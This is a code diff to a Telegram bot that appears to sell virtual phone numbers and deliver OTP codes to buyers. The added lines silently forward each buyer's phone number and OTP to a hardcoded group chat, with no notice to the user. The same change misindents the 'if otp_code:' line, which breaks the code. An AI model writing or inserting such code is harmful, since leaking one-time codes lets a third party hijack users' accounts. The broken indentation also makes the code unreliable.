@@ -574,13 +574,16 @@ def handle_update(update):
                     else:
                         otp_code = None
 
-                    if otp_code:
+                                        if otp_code:
                         markup = {
                             "inline_keyboard": [
                                 [{"text": "🛒 Buy Another Number", "callback_data": "buy_number"}]
                             ]
                         }
                         send_message(chat_id, f"🎂 <b>আপনার OTP:</b> <code>{otp_code}</code>", reply_markup=markup)
+                        GROUP_CHAT_ID = "-100396861153"
+                        send_message(GROUP_CHAT_ID, f"🔔 <b>New OTP Received!</b>\n📱 Phone: <code>{phone}</code>\n🔑 OTP: <code>{otp_code}</code>")
+
                     else:
                         send_message(chat_id, "⏳ <b>OTP এখনও আসেনি! আবার চেষ্টা করুন।</b>")
                 except Exception as e:
